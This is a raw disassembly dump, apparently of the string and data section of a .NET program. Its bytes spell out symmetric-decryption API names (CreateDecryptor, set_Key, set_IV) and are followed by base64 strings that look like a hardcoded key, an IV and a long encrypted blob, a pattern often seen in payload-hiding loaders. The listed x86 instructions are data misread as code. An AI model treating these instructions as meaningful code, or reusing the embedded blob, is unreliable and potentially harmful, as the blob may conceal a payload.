  4025d6:	43                   	inc    %ebx
  4025d7:	72 65                	jb     0x40263e
  4025d9:	61                   	popa
  4025da:	74 65                	je     0x402641
  4025dc:	00 53 79             	add    %dl,0x79(%ebx)
  4025df:	6d                   	insl   (%dx),%es:(%edi)
  4025e0:	6d                   	insl   (%dx),%es:(%edi)
  4025e1:	65 74 72             	gs je  0x402656
  4025e4:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4025eb:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  4025f2:	74 
  4025f3:	5f                   	pop    %edi
  4025f4:	4b                   	dec    %ebx
  4025f5:	65 79 00             	gs jns 0x4025f8
  4025f8:	73 65                	jae    0x40265f
  4025fa:	74 5f                	je     0x40265b
  4025fc:	49                   	dec    %ecx
  4025fd:	56                   	push   %esi
  4025fe:	00 43 69             	add    %al,0x69(%ebx)
  402601:	70 68                	jo     0x40266b
  402603:	65 72 4d             	gs jb  0x402653
  402606:	6f                   	outsl  %ds:(%esi),(%dx)
  402607:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  40260c:	74 5f                	je     0x40266d
  40260e:	4d                   	dec    %ebp
  40260f:	6f                   	outsl  %ds:(%esi),(%dx)
  402610:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  402615:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  40261c:	64 65 
  40261e:	00 73 65             	add    %dh,0x65(%ebx)
  402621:	74 5f                	je     0x402682
  402623:	50                   	push   %eax
  402624:	61                   	popa
  402625:	64 64 69 6e 67 00 49 	fs imul $0x72434900,%fs:0x67(%esi),%ebp
  40262c:	43 72 
  40262e:	79 70                	jns    0x4026a0
  402630:	74 6f                	je     0x4026a1
  402632:	54                   	push   %esp
  402633:	72 61                	jb     0x402696
  402635:	6e                   	outsb  %ds:(%esi),(%dx)
  402636:	73 66                	jae    0x40269e
  402638:	6f                   	outsl  %ds:(%esi),(%dx)
  402639:	72 6d                	jb     0x4026a8
  40263b:	00 43 72             	add    %al,0x72(%ebx)
  40263e:	65 61                	gs popa
  402640:	74 65                	je     0x4026a7
  402642:	44                   	inc    %esp
  402643:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  402647:	70 74                	jo     0x4026bd
  402649:	6f                   	outsl  %ds:(%esi),(%dx)
  40264a:	72 00                	jb     0x40264c
  40264c:	54                   	push   %esp
  40264d:	72 61                	jb     0x4026b0
  40264f:	6e                   	outsb  %ds:(%esi),(%dx)
  402650:	73 66                	jae    0x4026b8
  402652:	6f                   	outsl  %ds:(%esi),(%dx)
  402653:	72 6d                	jb     0x4026c2
  402655:	46                   	inc    %esi
  402656:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  40265d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  402660:	49                   	dec    %ecx
  402661:	44                   	inc    %esp
  402662:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  402669:	6c                   	insb   (%dx),%es:(%edi)
  40266a:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40266f:	70 6f                	jo     0x4026e0
  402671:	73 65                	jae    0x4026d8
  402673:	00 2e                	add    %ch,(%esi)
  402675:	63 63 74             	arpl   %esp,0x74(%ebx)
  402678:	6f                   	outsl  %ds:(%esi),(%dx)
  402679:	72 00                	jb     0x40267b
  40267b:	00 00                	add    %al,(%eax)
  40267d:	59                   	pop    %ecx
  40267e:	53                   	push   %ebx
  40267f:	00 53 00             	add    %dl,0x0(%ebx)
  402682:	45                   	inc    %ebp
  402683:	00 4b 00             	add    %cl,0x0(%ebx)
  402686:	47                   	inc    %edi
  402687:	00 67 00             	add    %ah,0x0(%edi)
  40268a:	6e                   	outsb  %ds:(%esi),(%dx)
  40268b:	00 56 00             	add    %dl,0x0(%esi)
  40268e:	58                   	pop    %eax
  40268f:	00 43 00             	add    %al,0x0(%ebx)
  402692:	59                   	pop    %ecx
  402693:	00 6d 00             	add    %ch,0x0(%ebp)
  402696:	4f                   	dec    %edi
  402697:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40269b:	00 65 00             	add    %ah,0x0(%ebp)
  40269e:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  4026a2:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4026a6:	44                   	inc    %esp
  4026a7:	00 7a 00             	add    %bh,0x0(%edx)
  4026aa:	71 00                	jno    0x4026ac
  4026ac:	79 00                	jns    0x4026ae
  4026ae:	30 00                	xor    %al,(%eax)
  4026b0:	4f                   	dec    %edi
  4026b1:	00 35 00 58 00 43    	add    %dh,0x43005800
  4026b7:	00 68 00             	add    %ch,0x0(%eax)
  4026ba:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  4026be:	48                   	dec    %eax
  4026bf:	00 39                	add    %bh,(%ecx)
  4026c1:	00 2f                	add    %ch,(%edi)
  4026c3:	00 47 00             	add    %al,0x0(%edi)
  4026c6:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  4026ca:	7a 00                	jp     0x4026cc
  4026cc:	44                   	inc    %esp
  4026cd:	00 6d 00             	add    %ch,0x0(%ebp)
  4026d0:	43                   	inc    %ebx
  4026d1:	00 30                	add    %dh,(%eax)
  4026d3:	00 3d 00 00 31 33    	add    %bh,0x33310000
  4026d9:	00 53 00             	add    %dl,0x0(%ebx)
  4026dc:	45                   	inc    %ebp
  4026dd:	00 46 00             	add    %al,0x0(%esi)
  4026e0:	78 00                	js     0x4026e2
  4026e2:	77 00                	ja     0x4026e4
  4026e4:	79 00                	jns    0x4026e6
  4026e6:	4c                   	dec    %esp
  4026e7:	00 55 00             	add    %dl,0x0(%ebp)
  4026ea:	38 00                	cmp    %al,(%eax)
  4026ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4026ed:	00 39                	add    %bh,(%ecx)
  4026ef:	00 34 00             	add    %dh,(%eax,%eax,1)
  4026f2:	4d                   	dec    %ebp
  4026f3:	00 2f                	add    %ch,(%edi)
  4026f5:	00 49 00             	add    %cl,0x0(%ecx)
  4026f8:	45                   	inc    %ebp
  4026f9:	00 77 00             	add    %dh,0x0(%edi)
  4026fc:	45                   	inc    %ebp
  4026fd:	00 69 00             	add    %ch,0x0(%ecx)
  402700:	46                   	inc    %esi
  402701:	00 51 00             	add    %dl,0x0(%ecx)
  402704:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  402709:	c0 00 a5             	rolb   $0xa5,(%eax)
  40270c:	81 64 00 6c 00 34 00 	andl   $0x2f003400,0x6c(%eax,%eax,1)
  402713:	2f 
  402714:	00 71 00             	add    %dh,0x0(%ecx)
  402717:	58                   	pop    %eax
  402718:	00 6f 00             	add    %ch,0x0(%edi)
  40271b:	77 00                	ja     0x40271d
  40271d:	75 00                	jne    0x40271f
  40271f:	31 00                	xor    %eax,(%eax)
  402721:	42                   	inc    %edx
  402722:	00 69 00             	add    %ch,0x0(%ecx)
  402725:	6f                   	outsl  %ds:(%esi),(%dx)
  402726:	00 72 00             	add    %dh,0x0(%edx)
  402729:	47                   	inc    %edi
  40272a:	00 56 00             	add    %dl,0x0(%esi)
  40272d:	51                   	push   %ecx
  40272e:	00 59 00             	add    %bl,0x0(%ecx)
  402731:	41                   	inc    %ecx
  402732:	00 45 00             	add    %al,0x0(%ebp)
  402735:	78 00                	js     0x402737
  402737:	69 00 50 00 77 00    	imul   $0x770050,(%eax),%eax
  40273d:	43                   	inc    %ebx
  40273e:	00 4b 00             	add    %cl,0x0(%ebx)
  402741:	61                   	popa
  402742:	00 61 00             	add    %ah,0x0(%ecx)
  402745:	33 00                	xor    (%eax),%eax
  402747:	6f                   	outsl  %ds:(%esi),(%dx)
  402748:	00 32                	add    %dh,(%edx)
  40274a:	00 65 00             	add    %ah,0x0(%ebp)
  40274d:	42                   	inc    %edx
  40274e:	00 67 00             	add    %ah,0x0(%edi)
  402751:	45                   	inc    %ebp
  402752:	00 32                	add    %dh,(%edx)
  402754:	00 36                	add    %dh,(%esi)
  402756:	00 4f 00             	add    %cl,0x0(%edi)
  402759:	7a 00                	jp     0x40275b
  40275b:	4a                   	dec    %edx
  40275c:	00 6a 00             	add    %ch,0x0(%edx)
  40275f:	31 00                	xor    %eax,(%eax)
  402761:	4d                   	dec    %ebp
  402762:	00 36                	add    %dh,(%esi)
  402764:	00 50 00             	add    %dl,0x0(%eax)
  402767:	39 00                	cmp    %eax,(%eax)
  402769:	68 00 4d 00 66       	push   $0x66004d00
  40276e:	00 46 00             	add    %al,0x0(%esi)
  402771:	63 00                	arpl   %eax,(%eax)
  402773:	34 00                	xor    $0x0,%al
  402775:	76 00                	jbe    0x402777
  402777:	49                   	dec    %ecx
  402778:	00 36                	add    %dh,(%esi)
  40277a:	00 77 00             	add    %dh,0x0(%edi)
  40277d:	74 00                	je     0x40277f
  40277f:	73 00                	jae    0x402781
  402781:	30 00                	xor    %al,(%eax)
  402783:	33 00                	xor    (%eax),%eax
  402785:	78 00                	js     0x402787
  402787:	55                   	push   %ebp
  402788:	00 69 00             	add    %ch,0x0(%ecx)
  40278b:	68 00 53 00 56       	push   $0x56005300
  402790:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  402794:	00 47 00             	add    %al,0x0(%edi)
  402797:	2b 00                	sub    (%eax),%eax
  402799:	48                   	dec    %eax
  40279a:	00 65 00             	add    %ah,0x0(%ebp)
  40279d:	37                   	aaa
  40279e:	00 2b                	add    %ch,(%ebx)
  4027a0:	00 71 00             	add    %dh,0x0(%ecx)
  4027a3:	32 00                	xor    (%eax),%al
  4027a5:	50                   	push   %eax
  4027a6:	00 76 00             	add    %dh,0x0(%esi)
  4027a9:	4c                   	dec    %esp
  4027aa:	00 58 00             	add    %bl,0x0(%eax)
  4027ad:	6d                   	insl   (%dx),%es:(%edi)
  4027ae:	00 6d 00             	add    %ch,0x0(%ebp)
  4027b1:	63 00                	arpl   %eax,(%eax)
  4027b3:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  4027b7:	4a                   	dec    %edx
  4027b8:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  4027bc:	00 63 00             	add    %ah,0x0(%ebx)
  4027bf:	33 00                	xor    (%eax),%eax
  4027c1:	5a                   	pop    %edx
  4027c2:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  4027c6:	00 30                	add    %dh,(%eax)
  4027c8:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027cb:	4c                   	dec    %esp
  4027cc:	00 6b 00             	add    %ch,0x0(%ebx)
  4027cf:	73 00                	jae    0x4027d1
  4027d1:	68 00 71 00 36       	push   $0x36007100
  4027d6:	00 5a 00             	add    %bl,0x0(%edx)
  4027d9:	51                   	push   %ecx
  4027da:	00 55 00             	add    %dl,0x0(%ebp)
  4027dd:	4c                   	dec    %esp
  4027de:	00 43 00             	add    %al,0x0(%ebx)
  4027e1:	5a                   	pop    %edx
  4027e2:	00 2f                	add    %ch,(%edi)
  4027e4:	00 6a 00             	add    %ch,0x0(%edx)
  4027e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4027e8:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  4027ec:	00 2f                	add    %ch,(%edi)
  4027ee:	00 77 00             	add    %dh,0x0(%edi)
  4027f1:	75 00                	jne    0x4027f3
  4027f3:	45                   	inc    %ebp
  4027f4:	00 47 00             	add    %al,0x0(%edi)
  4027f7:	70 00                	jo     0x4027f9
  4027f9:	75 00                	jne    0x4027fb
  4027fb:	56                   	push   %esi
  4027fc:	00 4f 00             	add    %cl,0x0(%edi)
  4027ff:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  402803:	39 00                	cmp    %eax,(%eax)
  402805:	78 00                	js     0x402807
  402807:	46                   	inc    %esi
  402808:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40280c:	00 38                	add    %bh,(%eax)
  40280e:	00 49 00             	add    %cl,0x0(%ecx)
  402811:	52                   	push   %edx
  402812:	00 62 00             	add    %ah,0x0(%edx)
  402815:	59                   	pop    %ecx
  402816:	00 47 00             	add    %al,0x0(%edi)
  402819:	6c                   	insb   (%dx),%es:(%edi)
  40281a:	00 65 00             	add    %ah,0x0(%ebp)
  40281d:	35 00 55 00 44       	xor    $0x44005500,%eax
  402822:	00 73 00             	add    %dh,0x0(%ebx)
  402825:	79 00                	jns    0x402827
  402827:	57                   	push   %edi
  402828:	00 4e 00             	add    %cl,0x0(%esi)
  40282b:	77 00                	ja     0x40282d
  40282d:	38 00                	cmp    %al,(%eax)
  40282f:	76 00                	jbe    0x402831
  402831:	61                   	popa
  402832:	00 73 00             	add    %dh,0x0(%ebx)
  402835:	63 00                	arpl   %eax,(%eax)
  402837:	42                   	inc    %edx
  402838:	00 56 00             	add    %dl,0x0(%esi)
  40283b:	42                   	inc    %edx
  40283c:	00 53 00             	add    %dl,0x0(%ebx)
  40283f:	48                   	dec    %eax
  402840:	00 67 00             	add    %ah,0x0(%edi)
  402843:	4c                   	dec    %esp
  402844:	00 6a 00             	add    %ch,0x0(%edx)
  402847:	57                   	push   %edi
  402848:	00 66 00             	add    %ah,0x0(%esi)
  40284b:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40284f:	6a 00                	push   $0x0
  402851:	67 00 76 00          	add    %dh,0x0(%bp)
  402855:	34 00                	xor    $0x0,%al
  402857:	52                   	push   %edx
  402858:	00 30                	add    %dh,(%eax)
  40285a:	00 79 00             	add    %bh,0x0(%ecx)
  40285d:	76 00                	jbe    0x40285f
  40285f:	69 00 79 00 59 00    	imul   $0x590079,(%eax),%eax
  402865:	6c                   	insb   (%dx),%es:(%edi)
  402866:	00 51 00             	add    %dl,0x0(%ecx)
  402869:	41                   	inc    %ecx
  40286a:	00 56 00             	add    %dl,0x0(%esi)
  40286d:	6e                   	outsb  %ds:(%esi),(%dx)
  40286e:	00 48 00             	add    %cl,0x0(%eax)
  402871:	4d                   	dec    %ebp
  402872:	00 48 00             	add    %cl,0x0(%eax)
  402875:	78 00                	js     0x402877
  402877:	56                   	push   %esi
  402878:	00 73 00             	add    %dh,0x0(%ebx)
  40287b:	68 00 78 00 45       	push   $0x45007800
  402880:	00 78 00             	add    %bh,0x0(%eax)
  402883:	35 00 4d 00 31       	xor    $0x31004d00,%eax
  402888:	00 6e 00             	add    %ch,0x0(%esi)
  40288b:	57                   	push   %edi
  40288c:	00 51 00             	add    %dl,0x0(%ecx)
  40288f:	58                   	pop    %eax
  402890:	00 6a 00             	add    %ch,0x0(%edx)
  402893:	63 00                	arpl   %eax,(%eax)
  402895:	48                   	dec    %eax
  402896:	00 72 00             	add    %dh,0x0(%edx)
  402899:	58                   	pop    %eax
  40289a:	00 72 00             	add    %dh,0x0(%edx)
  40289d:	62 00                	bound  %eax,(%eax)
  40289f:	78 00                	js     0x4028a1
  4028a1:	58                   	pop    %eax
  4028a2:	00 2b                	add    %ch,(%ebx)
  4028a4:	00 4f 00             	add    %cl,0x0(%edi)
  4028a7:	2b 00                	sub    (%eax),%eax
  4028a9:	6c                   	insb   (%dx),%es:(%edi)
  4028aa:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  4028ae:	00 2b                	add    %ch,(%ebx)
  4028b0:	00 30                	add    %dh,(%eax)
  4028b2:	00 69 00             	add    %ch,0x0(%ecx)
  4028b5:	38 00                	cmp    %al,(%eax)
  4028b7:	50                   	push   %eax
  4028b8:	00 65 00             	add    %ah,0x0(%ebp)
  4028bb:	63 00                	arpl   %eax,(%eax)
  4028bd:	44                   	inc    %esp
  4028be:	00 2b                	add    %ch,(%ebx)
  4028c0:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  4028c4:	00 47 00             	add    %al,0x0(%edi)
  4028c7:	77 00                	ja     0x4028c9
  4028c9:	56                   	push   %esi
  4028ca:	00 75 00             	add    %dh,0x0(%ebp)
  4028cd:	6c                   	insb   (%dx),%es:(%edi)
  4028ce:	00 69 00             	add    %ch,0x0(%ecx)
  4028d1:	2f                   	das
  4028d2:	00 51 00             	add    %dl,0x0(%ecx)
  4028d5:	2b 00                	sub    (%eax),%eax
  4028d7:	70 00                	jo     0x4028d9
  4028d9:	4a                   	dec    %edx
  4028da:	00 42 00             	add    %al,0x0(%edx)
  4028dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4028de:	00 4d 00             	add    %cl,0x0(%ebp)
  4028e1:	73 00                	jae    0x4028e3
  4028e3:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  4028e7:	41                   	inc    %ecx
  4028e8:	00 32                	add    %dh,(%edx)
  4028ea:	00 39                	add    %bh,(%ecx)
  4028ec:	00 37                	add    %dh,(%edi)
  4028ee:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  4028f2:	00 4e 00             	add    %cl,0x0(%esi)
  4028f5:	6c                   	insb   (%dx),%es:(%edi)
  4028f6:	00 31                	add    %dh,(%ecx)
  4028f8:	00 43 00             	add    %al,0x0(%ebx)
  4028fb:	74 00                	je     0x4028fd
  4028fd:	74 00                	je     0x4028ff
  4028ff:	2b 00                	sub    (%eax),%eax
  402901:	37                   	aaa
  402902:	00 46 00             	add    %al,0x0(%esi)
  402905:	5a                   	pop    %edx
  402906:	00 56 00             	add    %dl,0x0(%esi)
  402909:	75 00                	jne    0x40290b
  40290b:	32 00                	xor    (%eax),%al
  40290d:	5a                   	pop    %edx
  40290e:	00 32                	add    %dh,(%edx)
  402910:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  402914:	00 32                	add    %dh,(%edx)
  402916:	00 6d 00             	add    %ch,0x0(%ebp)
  402919:	39 00                	cmp    %eax,(%eax)
  40291b:	7a 00                	jp     0x40291d
  40291d:	32 00                	xor    (%eax),%al
  40291f:	34 00                	xor    $0x0,%al
  402921:	31 00                	xor    %eax,(%eax)
  402923:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  402926:	00 41 00             	add    %al,0x0(%ecx)
  402929:	62 00                	bound  %eax,(%eax)
  40292b:	4c                   	dec    %esp
  40292c:	00 79 00             	add    %bh,0x0(%ecx)
  40292f:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  402932:	00 43 00             	add    %al,0x0(%ebx)
  402935:	54                   	push   %esp
  402936:	00 57 00             	add    %dl,0x0(%edi)
  402939:	39 00                	cmp    %eax,(%eax)
  40293b:	64 00 35 00 41 00 56 	add    %dh,%fs:0x56004100
  402942:	00 2f                	add    %ch,(%edi)
  402944:	00 52 00             	add    %dl,0x0(%edx)
  402947:	62 00                	bound  %eax,(%eax)
  402949:	38 00                	cmp    %al,(%eax)
  40294b:	77 00                	ja     0x40294d
  40294d:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  402951:	6e                   	outsb  %ds:(%esi),(%dx)
  402952:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  402956:	00 65 00             	add    %ah,0x0(%ebp)
  402959:	34 00                	xor    $0x0,%al
  40295b:	71 00                	jno    0x40295d
  40295d:	4b                   	dec    %ebx
  40295e:	00 6b 00             	add    %ch,0x0(%ebx)
  402961:	53                   	push   %ebx
  402962:	00 2f                	add    %ch,(%edi)
  402964:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  402968:	00 67 00             	add    %ah,0x0(%edi)
  40296b:	58                   	pop    %eax
  40296c:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  402970:	00 77 00             	add    %dh,0x0(%edi)
  402973:	4f                   	dec    %edi
  402974:	00 38                	add    %bh,(%eax)
  402976:	00 5a 00             	add    %bl,0x0(%edx)
  402979:	4d                   	dec    %ebp
  40297a:	00 79 00             	add    %bh,0x0(%ecx)
  40297d:	5a                   	pop    %edx
  40297e:	00 38                	add    %bh,(%eax)
  402980:	00 70 00             	add    %dh,0x0(%eax)
  402983:	74 00                	je     0x402985
  402985:	70 00                	jo     0x402987
  402987:	57                   	push   %edi
  402988:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40298c:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  402990:	00 36                	add    %dh,(%esi)
  402992:	00 71 00             	add    %dh,0x0(%ecx)
  402995:	63 00                	arpl   %eax,(%eax)
  402997:	42                   	inc    %edx
  402998:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  40299c:	00 7a 00             	add    %bh,0x0(%edx)
  40299f:	7a 00                	jp     0x4029a1
  4029a1:	53                   	push   %ebx
  4029a2:	00 6b 00             	add    %ch,0x0(%ebx)
  4029a5:	4e                   	dec    %esi
  4029a6:	00 62 00             	add    %ah,0x0(%edx)
  4029a9:	66 00 52 00          	data16 add %dl,0x0(%edx)
  4029ad:	5a                   	pop    %edx
  4029ae:	00 71 00             	add    %dh,0x0(%ecx)
  4029b1:	4f                   	dec    %edi
  4029b2:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  4029b6:	00 55 00             	add    %dl,0x0(%ebp)
  4029b9:	47                   	inc    %edi
  4029ba:	00 71 00             	add    %dh,0x0(%ecx)
  4029bd:	63 00                	arpl   %eax,(%eax)
  4029bf:	67 00 57 00          	add    %dl,0x0(%bx)
  4029c3:	38 00                	cmp    %al,(%eax)
  4029c5:	51                   	push   %ecx
  4029c6:	00 4d 00             	add    %cl,0x0(%ebp)
  4029c9:	53                   	push   %ebx
  4029ca:	00 77 00             	add    %dh,0x0(%edi)
  4029cd:	76 00                	jbe    0x4029cf
  4029cf:	44                   	inc    %esp
  4029d0:	00 6b 00             	add    %ch,0x0(%ebx)
  4029d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029d4:	00 48 00             	add    %cl,0x0(%eax)
  4029d7:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4029db:	69 00 6e 00 38 00    	imul   $0x38006e,(%eax),%eax
  4029e1:	43                   	inc    %ebx
  4029e2:	00 69 00             	add    %ch,0x0(%ecx)
  4029e5:	39 00                	cmp    %eax,(%eax)
  4029e7:	76 00                	jbe    0x4029e9
  4029e9:	59                   	pop    %ecx
  4029ea:	00 45 00             	add    %al,0x0(%ebp)
  4029ed:	74 00                	je     0x4029ef
  4029ef:	70 00                	jo     0x4029f1
  4029f1:	38 00                	cmp    %al,(%eax)
  4029f3:	76 00                	jbe    0x4029f5
  4029f5:	33 00                	xor    (%eax),%eax
  4029f7:	71 00                	jno    0x4029f9
  4029f9:	39 00                	cmp    %eax,(%eax)
  4029fb:	34 00                	xor    $0x0,%al
  4029fd:	63 00                	arpl   %eax,(%eax)
  4029ff:	47                   	inc    %edi
  402a00:	00 2f                	add    %ch,(%edi)
  402a02:	00 52 00             	add    %dl,0x0(%edx)
  402a05:	34 00                	xor    $0x0,%al
  402a07:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  402a0b:	4c                   	dec    %esp
  402a0c:	00 32                	add    %dh,(%edx)
  402a0e:	00 52 00             	add    %dl,0x0(%edx)
  402a11:	64 00 2b             	add    %ch,%fs:(%ebx)
  402a14:	00 55 00             	add    %dl,0x0(%ebp)
  402a17:	46                   	inc    %esi
  402a18:	00 66 00             	add    %ah,0x0(%esi)
  402a1b:	6d                   	insl   (%dx),%es:(%edi)
  402a1c:	00 7a 00             	add    %bh,0x0(%edx)
  402a1f:	45                   	inc    %ebp
  402a20:	00 2f                	add    %ch,(%edi)
  402a22:	00 79 00             	add    %bh,0x0(%ecx)
  402a25:	46                   	inc    %esi
  402a26:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  402a2a:	00 6d 00             	add    %ch,0x0(%ebp)
  402a2d:	71 00                	jno    0x402a2f
  402a2f:	53                   	push   %ebx
  402a30:	00 35 00 38 00 4b    	add    %dh,0x4b003800
  402a36:	00 51 00             	add    %dl,0x0(%ecx)
  402a39:	62 00                	bound  %eax,(%eax)
  402a3b:	61                   	popa
  402a3c:	00 37                	add    %dh,(%edi)
  402a3e:	00 37                	add    %dh,(%edi)
  402a40:	00 72 00             	add    %dh,0x0(%edx)
  402a43:	68 00 72 00 45       	push   $0x45007200
  402a48:	00 4d 00             	add    %cl,0x0(%ebp)
  402a4b:	71 00                	jno    0x402a4d
  402a4d:	7a 00                	jp     0x402a4f
  402a4f:	72 00                	jb     0x402a51
  402a51:	54                   	push   %esp
  402a52:	00 34 00             	add    %dh,(%eax,%eax,1)
  402a55:	55                   	push   %ebp
  402a56:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  402a5a:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  402a5e:	00 42 00             	add    %al,0x0(%edx)
  402a61:	56                   	push   %esi
  402a62:	00 59 00             	add    %bl,0x0(%ecx)
  402a65:	69 00 76 00 64 00    	imul   $0x640076,(%eax),%eax
  402a6b:	56                   	push   %esi
  402a6c:	00 36                	add    %dh,(%esi)
  402a6e:	00 6a 00             	add    %ch,0x0(%edx)
  402a71:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  402a75:	76 00                	jbe    0x402a77
  402a77:	47                   	inc    %edi
  402a78:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  402a7c:	00 41 00             	add    %al,0x0(%ecx)
  402a7f:	46                   	inc    %esi
  402a80:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  402a84:	00 6d 00             	add    %ch,0x0(%ebp)
  402a87:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  402a8b:	79 00                	jns    0x402a8d
  402a8d:	4f                   	dec    %edi
  402a8e:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  402a92:	00 47 00             	add    %al,0x0(%edi)
  402a95:	43                   	inc    %ebx
  402a96:	00 2f                	add    %ch,(%edi)
  402a98:	00 33                	add    %dh,(%ebx)
  402a9a:	00 35 00 35 00 30    	add    %dh,0x30003500
  402aa0:	00 61 00             	add    %ah,0x0(%ecx)
  402aa3:	35 00 50 00 6a       	xor    $0x6a005000,%eax
  402aa8:	00 45 00             	add    %al,0x0(%ebp)
  402aab:	72 00                	jb     0x402aad
  402aad:	52                   	push   %edx
  402aae:	00 55 00             	add    %dl,0x0(%ebp)
  402ab1:	73 00                	jae    0x402ab3
  402ab3:	51                   	push   %ecx
  402ab4:	00 42 00             	add    %al,0x0(%edx)
  402ab7:	30 00                	xor    %al,(%eax)
  402ab9:	63 00                	arpl   %eax,(%eax)
  402abb:	4c                   	dec    %esp
  402abc:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  402ac0:	00 72 00             	add    %dh,0x0(%edx)
  402ac3:	77 00                	ja     0x402ac5
  402ac5:	7a 00                	jp     0x402ac7
  402ac7:	61                   	popa
  402ac8:	00 4a 00             	add    %cl,0x0(%edx)
  402acb:	78 00                	js     0x402acd
  402acd:	48                   	dec    %eax
  402ace:	00 37                	add    %dh,(%edi)
  402ad0:	00 39                	add    %bh,(%ecx)
  402ad2:	00 6a 00             	add    %ch,0x0(%edx)
  402ad5:	4a                   	dec    %edx
  402ad6:	00 37                	add    %dh,(%edi)
  402ad8:	00 6e 00             	add    %ch,0x0(%esi)
  402adb:	55                   	push   %ebp
  402adc:	00 71 00             	add    %dh,0x0(%ecx)
  402adf:	45                   	inc    %ebp
  402ae0:	00 6f 00             	add    %ch,0x0(%edi)
  402ae3:	68 00 6a 00 50       	push   $0x50006a00
  402ae8:	00 57 00             	add    %dl,0x0(%edi)
  402aeb:	58                   	pop    %eax
  402aec:	00 2b                	add    %ch,(%ebx)
  402aee:	00 4a 00             	add    %cl,0x0(%edx)
  402af1:	30 00                	xor    %al,(%eax)
  402af3:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  402af7:	76 00                	jbe    0x402af9
  402af9:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  402afd:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  402b01:	70 00                	jo     0x402b03
  402b03:	5a                   	pop    %edx
  402b04:	00 6d 00             	add    %ch,0x0(%ebp)
  402b07:	78 00                	js     0x402b09
  402b09:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  402b0d:	2b 00                	sub    (%eax),%eax
  402b0f:	4f                   	dec    %edi
  402b10:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  402b14:	00 6d 00             	add    %ch,0x0(%ebp)
  402b17:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  402b1b:	52                   	push   %edx
  402b1c:	00 34 00             	add    %dh,(%eax,%eax,1)
  402b1f:	4c                   	dec    %esp
  402b20:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  402b24:	00 32                	add    %dh,(%edx)
  402b26:	00 58 00             	add    %bl,0x0(%eax)
  402b29:	4c                   	dec    %esp
  402b2a:	00 73 00             	add    %dh,0x0(%ebx)
  402b2d:	69 00 34 00 4c 00    	imul   $0x4c0034,(%eax),%eax
  402b33:	6d                   	insl   (%dx),%es:(%edi)
  402b34:	00 38                	add    %bh,(%eax)
  402b36:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  402b3a:	00 75 00             	add    %dh,0x0(%ebp)
  402b3d:	4e                   	dec    %esi
  402b3e:	00 2f                	add    %ch,(%edi)
  402b40:	00 65 00             	add    %ah,0x0(%ebp)
  402b43:	6e                   	outsb  %ds:(%esi),(%dx)
  402b44:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  402b48:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  402b4c:	00 47 00             	add    %al,0x0(%edi)
  402b4f:	4c                   	dec    %esp
  402b50:	00 39                	add    %bh,(%ecx)
  402b52:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  402b56:	00 63 00             	add    %ah,0x0(%ebx)
  402b59:	31 00                	xor    %eax,(%eax)
